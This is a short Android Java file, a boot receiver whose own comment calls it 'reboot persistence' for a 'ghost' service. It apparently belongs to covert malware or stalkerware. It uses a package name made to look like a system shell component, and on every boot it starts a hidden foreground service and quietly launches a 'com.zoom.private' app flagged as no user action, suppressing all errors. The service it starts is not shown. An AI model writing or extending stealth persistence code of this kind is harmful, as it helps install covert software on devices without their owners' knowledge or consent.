package com.android.shell.ghost;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;

/**
 * Reboot persistence — auto-starts the ghost service on boot.
 */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) return;
        // Start the foreground service
        Intent serviceIntent = new Intent(context, GhostForegroundService.class);
        context.startService(serviceIntent);
        // Start the zoom-private client in the background
        try {
            Intent zoomIntent = new Intent();
            zoomIntent.setComponent(new android.content.ComponentName(
                    "com.zoom.private", "com.zoom.private.MainActivity"));
            zoomIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
            context.startActivity(zoomIntent);
        } catch (Exception ignored) {}
    }
}